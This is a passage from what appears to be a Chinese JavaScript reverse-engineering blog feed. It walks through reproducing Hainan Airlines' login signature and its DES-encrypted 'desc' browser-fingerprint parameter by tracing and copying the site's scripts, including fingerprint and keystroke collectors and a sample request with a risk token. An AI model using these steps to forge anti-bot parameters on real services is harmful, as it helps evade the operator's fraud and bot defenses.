src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101651366.png" alt="image.png"> </p><h2 id="3、自定义加密函数"><a href="#3、自定义加密函数" class="headerlink" title="3、自定义加密函数"></a>3、自定义加密函数</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">Spring</span> = <span class="title function_">_b</span>(<span class="number">38195</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  c = <span class="string">&#x27;&#123;&#125;&#x27;</span>,</span><br><span class="line">    p = <span class="string">&#x27;&#123;&quot;sname&quot;:&quot;Win32&quot;,&quot;sver&quot;:&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&quot;,&quot;schannel&quot;:&quot;HTML5&quot;,&quot;caller&quot;:&quot;HTML5&quot;,&quot;slang&quot;:&quot;zh-CN&quot;,&quot;did&quot;:&quot;97f572851c0ce1eb&quot;,&quot;stime&quot;:1696338450273,&quot;szone&quot;:-480,&quot;aname&quot;:&quot;com.hnair.spa.web.standard&quot;,&quot;aver&quot;:&quot;9.0.0&quot;,&quot;akey&quot;:&quot;9E4BBDDEC6C8416EA380E418161A7CD3&quot;,&quot;abuild&quot;:&quot;45469&quot;,&quot;atarget&quot;:&quot;standard&quot;,&quot;slat&quot;:&quot;slat&quot;,&quot;slng&quot;:&quot;slng&quot;,&quot;gtcid&quot;:&quot;defualt_web_gtcid&quot;,&quot;riskToken&quot;:&quot;651abaafiQI4S3rKQfX7DXPlLlrGKPBuW2iBlSJ1&quot;,&quot;captchaToken&quot;:&quot;&quot;,&quot;number&quot;:&quot;15888888888&quot;,&quot;pin&quot;:&quot;JwWZ9E/1ZByN8jrtlHnMhJpNaELFx0rZ3iQgeqCMIaYS2sfOgDvofgDSvowAO5yUM9i8shhYV/KlViMgwrtMdAfSZgpTvUzETQrrPgf2nCdA+7sh+sWGSEQKTlCwzom67NNkEqqzO1QPUbJJa5XlNjKTa8obqdvZ9dbs/kF/tWE=&quot;,&quot;toSave&quot;:true&#125;&#x27;</span>,</span><br><span class="line">    n = <span class="literal">null</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">makeSign</span>(<span class="params">c,p,n</span>)&#123;</span><br><span class="line">    c = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(c)</span><br><span class="line">    p = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(p)</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Spring</span>.<span class="title function_">_makeSign</span>(<span class="literal">null</span>, c, p, <span class="literal">null</span>, n)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4、测试"><a href="#4、测试" class="headerlink" title="4、测试"></a>4、测试</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101651670.png" alt="image.png"> </p><h1 id="三、完整代码"><a href="#三、完整代码" class="headerlink" title="三、完整代码"></a>三、完整代码</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">略略略</span><br><span class="line">~~~</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JS逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS逆向 </tag>
            
            <tag> 验签 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>海南航空Desc补环境</title>
      <link href="/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BADesc%E8%A1%A5%E7%8E%AF%E5%A2%83/"/>
      <url>/2024/05/10/%E6%B5%B7%E5%8D%97%E8%88%AA%E7%A9%BADesc%E8%A1%A5%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="一、逆向目标"><a href="#一、逆向目标" class="headerlink" title="一、逆向目标"></a>一、逆向目标</h1><ul><li>目标：海南航空Desc补环境初探</li><li>链接：<a href="https://m.hnair.com/#/login?_k=oepcby">https://m.hnair.com/#/login?_k=oepcby</a></li><li>简介：浏览器指纹，补环境初探</li></ul><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101635232.png" alt="image.png"> </p><h1 id="二、逆向参数"><a href="#二、逆向参数" class="headerlink" title="二、逆向参数"></a>二、逆向参数</h1><h2 id="1、定位desc加密位置"><a href="#1、定位desc加密位置" class="headerlink" title="1、定位desc加密位置"></a>1、定位desc加密位置</h2><p>搜索关键字 “desc&#x3D;”，有两处位置，都打上断点，成功定位到了加密位置：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101636163.png" alt="image.png"> </p><p>可以看到这块的 U 就是加密后的 desc</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var u = function() &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            return (new born).getCiphertext()</span><br><span class="line">                        &#125; catch (e) &#123;</span><br><span class="line">                            return null</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;();</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101637632.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">return (new born).getCiphertext()</span><br></pre></td></tr></table></figure><h2 id="2、加密函数分析"><a href="#2、加密函数分析" class="headerlink" title="2、加密函数分析"></a>2、加密函数分析</h2><p><strong>1）跟进定义的对象 born 中，发现只是定义了这个对象里面没有任何属性和方法</strong></p><p>猜测可能是这个类的   构造方法&#x2F;原型对象  中有定义相关内容。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101638100.png" alt="image.png"> </p><p><strong>2）所以，直接跟进(new born).getCiphertext这个方法中 ，发现了如下代码</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">born.prototype = &#123;</span><br><span class="line">    getCiphertext: function() &#123;</span><br><span class="line">        return ciphertext</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640855.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640299.png" alt="image.png"> </p><p>这块是直接返回了一个 “ciphertext” ,也没有调用任何函数。所以猜测这个 “ciphertext” 可能是个全局变量</p><p><strong>3）所以，在当前JS中搜索一下关键字  “ciphertext” ，找到5处，都打上断点，看看会断在哪儿</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101640538.png" alt="image.png"> </p><p>但是，点击【登录】后，发现并没有断下，这是为啥你？？？？</p><p>这是因为，desc表示的是浏览器的指纹信息，并且将其定义为了全局变量，猜测可能是在页面加载的时候就定义好了已经。所以，我们刷新页面，成功断下：</p><p>这块是将 “t” 赋值给了 “ciphertext”</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101641949.png" alt="image.png"> </p><p><strong>4）向前跟栈，找到定义参数 t 的位置：</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101641107.png" alt="image.png"> </p><p>这块可以判断处当前加密为 DES加密方式。</p><p><strong>5）这个函数传入了两个参数 e 和 t</strong></p><p>向前继续跟栈，找到了这两个参数的定义处：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var fingerprint = (new referFingerprint).get();</span><br><span class="line">window[_hqjl(&quot;rzKroleD&quot;, 3, 3)] = function(e) &#123;</span><br><span class="line">    mcArrs.ex_mouse(e);</span><br><span class="line">    var t = &#123;</span><br><span class="line">        xy: mcArrs,</span><br><span class="line">        fingerprint: fingerprint</span><br><span class="line">    &#125;</span><br><span class="line">      , r = JSON.stringify(t)</span><br><span class="line">      , n = eq_u(r, zznu(zre));</span><br><span class="line">    window[coyp](_hqjl(&quot;ycrtrehpixext\\&quot;, 7, 2) + &quot;=&#x27;&quot; + n + &quot;&#x27;&quot;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642402.png" alt="image.png"> </p><p>①第一个参数r：</p><p>暴力扣取JS，将这个函数之前的待JS全部扣取下来，测试，成功拿到参数r的值</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642501.png" alt="image.png"> </p><p>②第二个参数 zznu(zre) </p><p>这块就只需要将 zznu 这个函数扣取下来即可：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101642328.png" alt="image.png"> </p><p>然后是zre这个变量值：</p><p>暂时没有找到是在哪儿定义的，先不管了！</p><p><strong>6）扣取JS并测试</strong></p><p>有一些小坑，但是可以暴力一点，将整个JS都扣取下来，然后哪块报错就删除哪块：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405101643274.png" alt="image.png"> </p><h1 id="三、完整代码"><a href="#三、完整代码" class="headerlink" title="三、完整代码"></a>三、完整代码</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">keypress</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t = <span class="number">0</span></span><br><span class="line">      , r = <span class="number">0</span></span><br><span class="line">      , e = e || event;</span><br><span class="line">    t = e.<span class="property">keyCode</span> || e.<span class="property">which</span> || e.<span class="property">charCode</span>,</span><br><span class="line">    r = t &gt;= <span class="number">65</span> &amp;&amp; <span class="number">90</span> &gt;= t,</span><br><span class="line">    z = t &gt;= <span class="number">97</span> &amp;&amp; <span class="number">122</span> &gt;= t,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(t)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">keydown</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = e || event</span><br><span class="line">      , t = e.<span class="property">keyCode</span> || e.<span class="property">which</span> || e.<span class="property">charCode</span></span><br><span class="line">      , r = t;</span><br><span class="line">    t &gt; <span class="number">7</span> &amp;&amp; <span class="number">14</span> &gt; t || <span class="number">20</span> == t || <span class="number">91</span> == t || <span class="number">16</span> == t || <span class="number">17</span> == t || <span class="number">222</span> == t || t &gt; <span class="number">31</span> &amp;&amp; <span class="number">47</span> &gt; t || t &gt; <span class="number">111</span> &amp;&amp; <span class="number">124</span> &gt; t ? (e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? r = <span class="string">&quot;CTRL+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;ALT+&quot;</span> + r : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;SHIFT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r),</span><br><span class="line">    <span class="string">&quot;&quot;</span> != r &amp;&amp; mcArrps.<span class="title function_">push</span>(r)) : <span class="variable language_">window</span>.<span class="property">ActiveXObject</span> &amp;&amp; -<span class="number">1</span> != navigator.<span class="property">appVersion</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;Windows&quot;</span>) ? (r = t,</span><br><span class="line">    e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? r = <span class="string">&quot;CTRL+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;ALT+&quot;</span> + r : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;SHIFT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r),</span><br><span class="line">    <span class="string">&quot;&quot;</span> != r &amp;&amp; mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t ? (r = <span class="string">&quot;CTRL+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? (r = <span class="string">&quot;ALT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t ? (r = <span class="string">&quot;CTRL+ALT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">ctrlKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;CTRL+ALT+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">18</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t ? (r = <span class="string">&quot;ALT+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r)) : e.<span class="property">altKey</span> &amp;&amp; <span class="number">17</span> != t &amp;&amp; e.<span class="property">shiftKey</span> &amp;&amp; <span class="number">16</span> != t &amp;&amp; (r = <span class="string">&quot;CTRL+SHIFT+&quot;</span> + r,</span><br><span class="line">    mcArrps.<span class="title function_">push</span>(r))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">del_html_tags</span>(<span class="params">e, t, r</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> n = <span class="keyword">new</span> <span class="title class_">RegExp</span>(t,<span class="string">&quot;g&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> words = e.<span class="title function_">replace</span>(n, r),</span><br><span class="line">    words</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getScriptPaths</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> e, t = <span class="variable language_">document</span>.<span class="property">scripts</span>, r = t.<span class="property">length</span>; r &gt; <span class="number">0</span>; r--)</span><br><span class="line">        t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;ex_mouse.js&quot;</span>) &gt; -<span class="number">1</span> &amp;&amp; (e = t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">substring</span>(<span class="number">0</span>, t[r - <span class="number">1</span>].<span class="property">src</span>.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBroClient</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = <span class="keyword">new</span> <span class="title function_">referFingerprint</span>(&#123;</span><br><span class="line">        <span class="attr">canvas</span>: !<span class="number">0</span></span><br><span class="line">    &#125;)</span><br><span class="line">      , t = <span class="built_in">parseInt</span>((<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">getTime</span>() / <span class="number">1e3</span>)</span><br><span class="line">      , r = &#123;&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span> &amp;&amp; (r.<span class="property">dc_domain</span> = <span class="variable language_">document</span>.<span class="property">domain</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_url</span> = <span class="variable language_">document</span>.<span class="property">URL</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_title</span> = <span class="variable language_">document</span>.<span class="property">title</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_referrer</span> = <span class="variable language_">document</span>.<span class="property">referrer</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_cookies</span> = <span class="variable language_">document</span>.<span class="property">cookie</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_websign</span> = e.<span class="title function_">get</span>() || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_arrtime</span> = t || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_officeXY</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> + <span class="string">&quot;x &quot;</span> + <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> + <span class="string">&quot;y&quot;</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">dc_coloriDepth</span> = broClient.<span class="title function_">coloriDepth</span>(<span class="variable language_">window</span>.<span class="property">navigator</span>) || <span class="string">&quot;&quot;</span>),</span><br><span class="line">    <span class="variable language_">window</span> &amp;&amp; <span class="variable language_">window</span>.<span class="property">screen</span> &amp;&amp; (r.<span class="property">sh</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">height</span> || <span class="number">0</span>,</span><br><span class="line">    r.<span class="property">sw</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">width</span> || <span class="number">0</span>,</span><br><span class="line">    r.<span class="property">cd</span> = <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">colorDepth</span> || <span class="number">0</span>),</span><br><span class="line">    navigator &amp;&amp; (r.<span class="property">na_appcodename</span> = navigator.<span class="property">appCodeName</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_minor</span> = navigator.<span class="property">appMinorVersion</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_appname</span> = navigator.<span class="property">appName</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_appversion</span> = navigator.<span class="property">appVersion</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_bl</span> = navigator.<span class="property">browserLanguage</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_cookiesEnable</span> = navigator.<span class="property">cookieEnabled</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_cpuclass</span> = navigator.<span class="property">cpuClass</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_online</span> = navigator.<span class="property">onLine</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_platform</span> = navigator.<span class="property">platform</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_syslan</span> = navigator.<span class="property">systemLanguage</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_useragent</span> = navigator.<span class="property">userAgent</span> || <span class="string">&quot;&quot;</span>,</span><br><span class="line">    r.<span class="property">na_userlang</span> = navigator.<span class="property">userLanguage</span> || <span class="string">&quot;&quot;</span>),</span><br><span class="line">    r</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">broWidgetIe</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> t = [], r = <span class="number">0</span>; r &lt; e.<span class="property">length</span>; r++) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            widget = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(e[r])</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        &#125;</span><br><span class="line">        t.<span class="title function_">push</span>(e[r])</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getBroWidgetInfo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = &#123;</span><br><span class="line">        <span class="title class_">ShockwaveFlash</span>: broWidget.<span class="title function_">shockwaveFlash</span>(),</span><br><span class="line">        <span class="title class_">ReadPlayer</span>: broWidget.<span class="title function_">readPlayer</span>(),</span><br><span class="line">        <span class="title class_">AdobeReader</span>: broWidget.<span class="title function_">adobeReader</span>(),</span><br><span class="line">        <span class="title class_">QuickTimePlayer</span>: broWidget.<span class="title function_">quickTimePlayer</span>(),</span><br><span class="line">        <span class="title class_">ShockwavePlayer</span>: broWidget.<span class="title function_">shockwavePlayer</span>(),</span><br><span class="line">        <span class="title class_">WindowsMediaPlayer</span>: broWidget.<span class="title function_">windowsMediaPlayer</span>()</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> e</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getShockwaveFlash</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;ShockwaveFlash.ShockwaveFlash&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = r.<span class="title class_">GetVariable</span>(<span class="string">&quot;$version&quot;</span>).<span class="title function_">substring</span>(<span class="number">4</span>),</span><br><span class="line">        t = t.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t[<span class="number">0</span>] + <span class="string">&quot;.&quot;</span> + t[<span class="number">1</span>]))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = navigator.<span class="property">plugins</span>[<span class="string">&quot;Shockwave Flash&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getReadPlayer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> r = [<span class="string">&quot;rmocx.RealPlayer G2 Control&quot;</span>, <span class="string">&quot;rmocx.RealPlayer G2 Control.1&quot;</span>, <span class="string">&quot;RealPlayer.RealPlayer(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealVideo.RealVideo(tm) ActiveX Control (32-bit)&quot;</span>, <span class="string">&quot;RealPlayer&quot;</span>], n = <span class="literal">null</span>, i = <span class="number">0</span>; i &lt; r.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                n = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(r[i])</span><br><span class="line">            &#125; <span class="keyword">catch</span> (o) &#123;</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (n)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        n &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = n.<span class="title class_">GetVersionInfo</span>(),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = <span class="keyword">void</span> <span class="number">0</span> == navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span> ? navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span> : navigator.<span class="property">plugins</span>.<span class="property">RealPlayer</span>;</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getQuickTimePlayer</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> e = !<span class="number">1</span></span><br><span class="line">      , t = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">ActiveXObject</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> r = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;QuickTime.QuickTime&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;&#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            r = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;QuickTimeCheckObject.QuickTimeCheck&quot;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (n) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        r &amp;&amp; (e = !<span class="number">0</span>,</span><br><span class="line">        t = r.<span class="property">QuickTimeVersion</span>.<span class="title function_">toString</span>(<span class="number">16</span>),</span><br><span class="line">        t = t.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">1</span>) + <span class="string">&quot;.&quot;</span> + t.<span class="title function_">substring</span>(<span class="number">1</span>, <span class="number">3</span>),</span><br><span class="line">        t = <span class="built_in">parseFloat</span>(t))</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        t = navigator.<span class="property">plugins</span>[<span class="string">&quot;Adobe QuickTime&quot;</span>];</span><br><span class="line">    <span class="keyword">return</span> t = <span class="literal">null</span> != t || <span class="keyword">void</span> <span class="number">0</span> != t ? <span class="number">1</span> : <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getClientUserAgent</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">navigator</span>.<span class="property">userAgent</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getScreenXY</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> screen.<span class="property">width</span> + <span class="string">&quot;x &quot;</span> + screen.<span class="property">height</span> + <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getOfficeXY</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availWidth</span> + <span class="string">&quot;x &quot;</span> + <span class="variable language_">window</span>.<span class="property">screen</span>.<span class="property">availHeight</span> + <span class="string">&quot;y&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">coloriDepth</span>(<span class="params">e</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> t, r = e;</span><br><span class="line">    <span class="keyword">return</span> t = <span class="string">&quot;Netscape&quot;</span> != r ? screen.<span class="property">colorDepth</span> : screen.<span class="property">pixelDepth</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> coypJsDk = 